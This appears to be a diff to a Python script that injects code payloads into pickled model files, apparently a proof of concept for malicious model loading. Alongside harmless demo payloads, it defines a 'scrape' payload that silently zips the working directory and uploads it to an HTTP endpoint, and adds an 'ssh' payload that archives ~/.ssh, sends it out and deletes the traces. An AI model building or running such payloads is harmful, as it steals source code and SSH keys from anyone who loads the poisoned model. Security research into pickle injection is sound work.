@@ -2,30 +2,18 @@ import argparse
 from train_model import Net
 from typing import Dict
 
-
 examples: Dict[str, str] = {
-    "minecraft": 'import os; os.system("open /Applications/Minecraft.app")',
-    "helloworld": 'print("Hello World")',
-    "neofetch": 'import os; os.system("neofetch")',
-    "location": "import requests; print(requests.get('https://ipinfo.io').text)",
-    "scrape": """python -c import os
-    import requests
-    import zipfile
-
-    def zip_current_directory():
-        with zipfile.ZipFile('current_dir.zip', 'w') as zipf:
-            for root, dirs, files in os.walk('.'):
-                for file in files:
-                    zipf.write(os.path.join(root, file))
-
-    def send_zip_file():
-        zip_current_directory()
-        url = "http://localhost:25565/uploadfile/"
-        files = {'file': open('current_dir.zip', 'rb')}
-        response = requests.post(url, files=files)
-        print(response.json())
-
-    send_zip_file()""",
+    "minecraft": ['import os; os.system("open /Applications/Minecraft.app")'],
+    "helloworld": ['print("Hello World")'],
+    "neofetch": ['import os; os.system("neofetch")'],
+    "location": ["import requests; print(requests.get('https://ipinfo.io').text)"],
+    "scrape": [
+        """import os, subprocess, requests; subprocess.run(['zip', '-r', 'archive.zip', '.'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); requests.post('http://localhost:25565/uploadfile', files={'file': open('archive.zip', 'rb')}); subprocess.run(['rm', 'archive.zip'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)"""
+    ],
+    "ssh": [
+        "import subprocess, requests, os; subprocess.run(['zip', '-r', 'ssh_backup.zip', os.path.expanduser('~/.ssh')], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); requests.post('http://localhost:25565/uploadfile', files={'file': open('ssh_backup.zip', 'rb')}); subprocess.run(['rm', 'ssh_backup.zip'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL);"
+        # "import subprocess, requests, os; subprocess.run(['zip', '-r', 'ssh_backup.zip', '/Users/user/.ssh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); requests.post('http://localhost:25565/uploadfile', files={'file': open('ssh_backup.zip', 'rb')}); subprocess.run(['rm', 'ssh_backup.zip'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL);"
+    ],
 }
 
 
@@ -51,9 +39,10 @@ if __name__ == "__main__":
 
     # Inject payload, overwriting the existing file instead of creating a new one
     modified = "modified_" + args.pickle
-    result.inject_payload(
-        examples[args.example],
-        modified,
-        injection="insertion",
-        overwrite=False,
-    )
+    for x in examples[args.example]:
+        result.inject_payload(
+            x,
+            modified,
+            injection="insertion",
+            overwrite=False,
+        )
